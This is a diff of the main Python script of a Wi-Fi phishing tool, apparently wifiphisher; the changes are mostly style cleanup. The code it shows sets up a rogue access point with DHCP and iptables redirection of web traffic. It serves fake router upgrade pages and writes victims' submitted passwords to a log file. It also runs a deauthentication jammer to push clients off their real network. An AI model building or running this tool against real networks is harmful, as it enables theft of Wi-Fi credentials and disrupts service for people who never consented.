@@ -11,10 +11,8 @@ import BaseHTTPServer
 import ConfigParser
 import httplib
 import SocketServer
-import logging
 import cgi
 import string
-import signal
 import lib.fakeAP as fap
 import lib.wifijammer as wj
 from threading import Thread
@@ -31,23 +29,24 @@ PHISING_PAGES = "access-point-pages"
 DN = open(os.devnull, 'w')
 
 # Console colors
-W  = '\033[0m'  # white (normal)
-R  = '\033[31m' # red
-G  = '\033[32m' # green
-O  = '\033[33m' # orange
-B  = '\033[34m' # blue
-P  = '\033[35m' # purple
-C  = '\033[36m' # cyan
-GR = '\033[37m' # gray
-T  = '\033[93m' # tan
+W = '\033[0m'    # white (normal)
+R = '\033[31m'   # red
+G = '\033[32m'   # green
+O = '\033[33m'   # orange
+B = '\033[34m'   # blue
+P = '\033[35m'   # purple
+C = '\033[36m'   # cyan
+GR = '\033[37m'  # gray
+T = '\033[93m'   # tan
+
 
 class SecureHTTPServer(BaseHTTPServer.HTTPServer):
     """
-    Simple HTTP server that extends the SimpleHTTPServer standard 
-    module to support the SSL protocol. 
+    Simple HTTP server that extends the SimpleHTTPServer standard
+    module to support the SSL protocol.
 
-    Only the server is authenticated while the client remains 
-    unauthenticated (i.e. the server will not request a client 
+    Only the server is authenticated while the client remains
+    unauthenticated (i.e. the server will not request a client
     certificate).
 
     It also reacts to self.stop flag.
@@ -56,15 +55,15 @@ class SecureHTTPServer(BaseHTTPServer.HTTPServer):
         SocketServer.BaseServer.__init__(self, server_address, HandlerClass)
         fpem = PEM
         self.socket = ssl.SSLSocket(
-        socket.socket(self.address_family,self.socket_type),
-        keyfile = fpem,
-        certfile = fpem
+            socket.socket(self.address_family, self.socket_type),
+            keyfile=fpem,
+            certfile=fpem
         )
 
         self.server_bind()
         self.server_activate()
 
-    def serve_forever (self):
+    def serve_forever(self):
         """
         Handles one request at a time until stopped.
         """
@@ -72,9 +71,10 @@ class SecureHTTPServer(BaseHTTPServer.HTTPServer):
         while not self.stop:
             self.handle_request()
 
+
 class SecureHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
     """
-    Request handler for the HTTPS server. It responds to 
+    Request handler for the HTTPS server. It responds to
     everything with a 301 redirection to the HTTP server.
     """
     def do_QUIT(self):
@@ -93,7 +93,7 @@ class SecureHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
     def do_GET(self):
         self.send_response(301)
         self.send_header('Location', 'http://10.0.0.1:' + str(PORT))
-        self.end_headers() 
+        self.end_headers()
 
     def log_message(self, format, *args):
         return
@@ -103,11 +103,15 @@ class HTTPServer(BaseHTTPServer.HTTPServer):
     """
     HTTP server that reacts to self.stop flag.
     """
-    def serve_forever (self):
-        """Handle one request at a time until stopped."""
+
+    def serve_forever(self):
+        """
+        Handle one request at a time until stopped.
+        """
         self.stop = False
         while not self.stop:
             self.handle_request()
+
 
 class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
     """
@@ -130,9 +134,9 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
 
         if self.path == "/":
             with open("/tmp/wifiphisher-webserver.tmp", "a+") as log_file:
-                log_file.write('['+T+'*'+W+'] ' + O + \
-                "GET " + T + \
-                self.client_address[0] + W + "\n")
+                log_file.write('[' + T + '*' + W + '] ' + O + "GET " + T +
+                               self.client_address[0] + W + "\n"
+                               )
                 log_file.close()
             self.path = "index.html"
         self.path = "%s/%s/%s" % (PHISING_PAGES, d['router'], self.path)
@@ -145,7 +149,7 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
             s = string.Template(f.read())
             s = s.substitute(d)
             self.send_response(200)
-            self.send_header('Content-type','text-html')
+            self.send_header('Content-type', 'text-html')
             self.end_headers()
             # Send file content to client
             self.wfile.write(s)
@@ -158,8 +162,8 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
         form = cgi.FieldStorage(
             fp=self.rfile,
             headers=self.headers,
-            environ={'REQUEST_METHOD':'POST',
-                     'CONTENT_TYPE':self.headers['Content-Type'],
+            environ={'REQUEST_METHOD': 'POST',
+                     'CONTENT_TYPE': self.headers['Content-Type'],
                      })
         for item in form.list:
             if item.value:
@@ -168,16 +172,17 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
                     self.send_header('Location', '/upgrading.html')
                     self.end_headers()
                     with open("/tmp/wifiphisher-webserver.tmp", "a+") as log_file:
-                        log_file.write('['+T+'*'+W+'] ' + O + \
-                              "POST " + T \
-                              + self.client_address[0] + \
-                              R + " password=" + item.value + \
-                              W + "\n")
+                        log_file.write('[' + T + '*' + W + '] ' + O + "POST " +
+                                       T + self.client_address[0] +
+                                       R + " password=" + item.value +
+                                       W + "\n"
+                                       )
                         log_file.close()
                     return
 
     def log_message(self, format, *args):
         return
+
 
 def stop_server(port=PORT, ssl_port=SSL_PORT):
     """
@@ -190,6 +195,7 @@ def stop_server(port=PORT, ssl_port=SSL_PORT):
     conn = httplib.HTTPSConnection("localhost:%d" % ssl_port)
     conn.request("QUIT", "/")
     conn.getresponse()
+
 
 def config_section_map(section):
     """
@@ -207,14 +213,16 @@ def config_section_map(section):
             dict1[option] = None
     return dict1
 
+
 def sniff_dot11(mon_iface):
     """
     Taken from wifijammer. We need this here to run it from a thread.
     """
     try:
         sniff(iface=mon_iface, store=0, prn=wj.cb)
-    except Exception as msg:
+    except Exception:
         pass
+
 
 def shutdown():
     """
@@ -228,7 +236,7 @@ def shutdown():
     os.system('iptables -t nat -F')
     os.system('iptables -t nat -X')
     os.system('pkill airbase-ng')
-    os.system('pkill dhcpd') # Dangerous?
+    os.system('pkill dhcpd')
     if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
         os.remove('/tmp/wifiphisher-webserver.tmp')
     if os.path.isfile('/tmp/wifiphisher-jammer.tmp'):
@@ -236,7 +244,7 @@ def shutdown():
     fap.rm_mon()
     if not wj.monitor_on:
         wj.remove_mon_iface(mon_iface)
-    print '\n['+R+'!'+W+'] Closing'
+    print '\n[' + R + '!' + W + '] Closing'
     sys.exit(0)
 
 if __name__ == "__main__":
@@ -244,7 +252,7 @@ if __name__ == "__main__":
     # Start HTTP server in a background thread
     Handler = HTTPRequestHandler
     httpd = HTTPServer(("", PORT), Handler)
-    print '['+T+'*'+W+'] Starting HTTP server at port ' + str(PORT)
+    print '[' + T + '*' + W + '] Starting HTTP server at port ' + str(PORT)
     webserver = Thread(target=httpd.serve_forever)
     webserver.daemon = True
     webserver.start()
@@ -252,14 +260,14 @@ if __name__ == "__main__":
     # Start HTTPS server in a background thread
     Handler = SecureHTTPRequestHandler
     httpd = SecureHTTPServer(("", SSL_PORT), Handler)
-    print '['+T+'*'+W+'] Starting HTTPS server at port ' + str(SSL_PORT)
+    print '[' + T + '*' + W + '] Starting HTTPS server at port ' + str(SSL_PORT)
     secure_webserver = Thread(target=httpd.serve_forever)
     secure_webserver.daemon = True
     secure_webserver.start()
 
     # Are you root?
     if os.geteuid():
-        sys.exit('['+R+'-'+W+'] Please run as root')
+        sys.exit('[' + R + '-' + W + '] Please run as root')
 
     # Get isc dhcp server if needed
     fap.get_isc_dhcp_server()
@@ -281,7 +289,7 @@ if __name__ == "__main__":
     wj_iface = wj.get_mon_iface(wj.parse_args(), inet_iface)
     ap_iface = fap.AP_iface(interfaces, inet_iface, wj_iface)
     if not ap_iface:
-        sys.exit('['+R+'-'+W+'] Found internet connected interface in '+T+inet_iface+W+'. \
+        sys.exit('[' + R + '-' + W + '] Found internet connected interface in ' + T + inet_iface + W + '. \
         Please bring up a wireless interface to use as the fake access point.')
     ipf = fap.iptables(inet_iface)
 
@@ -290,7 +298,7 @@ if __name__ == "__main__":
     os.system('iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:%s' % SSL_PORT)
     Popen(['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'], stdout=DN, stderr=PIPE)
 
-    print '['+T+'*'+W+'] Cleared leases, started DHCP, set up iptables'
+    print '[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables'
     mon_iface = fap.start_monitor(ap_iface, channel)
     mon_mac = fap.get_mon_mac(mon_iface)
 
@@ -307,7 +315,10 @@ if __name__ == "__main__":
     dhcpconf = fap.dhcp_conf(ipprefix)
     fap.dhcp(dhcpconf, ipprefix)
     os.system('clear')
-    print '['+T+'*'+W+'] '+T+essid+W+' set up on channel '+T+channel+W+' via '+T+mon_iface+W+' on '+T+ap_iface+W
+    print '[' + T + '*' + W + '] ' + T + \
+          essid + W + ' set up on channel ' + \
+          T + channel + W + ' via ' + T + mon_iface \
+          + W + ' on ' + T + ap_iface + W
 
     # wifijammer initialization
     wj.clients_APs = []
@@ -326,7 +337,7 @@ if __name__ == "__main__":
     wj.hop = wj.Thread(target=wj.channel_hop, args=(wj_iface, wj.args))
     wj.hop.daemon = True
     wj.hop.start()
- 
+
     wj.sniff = wj.Thread(target=sniff_dot11, args=(wj_iface,))
     wj.sniff.daemon = True
     wj.sniff.start()
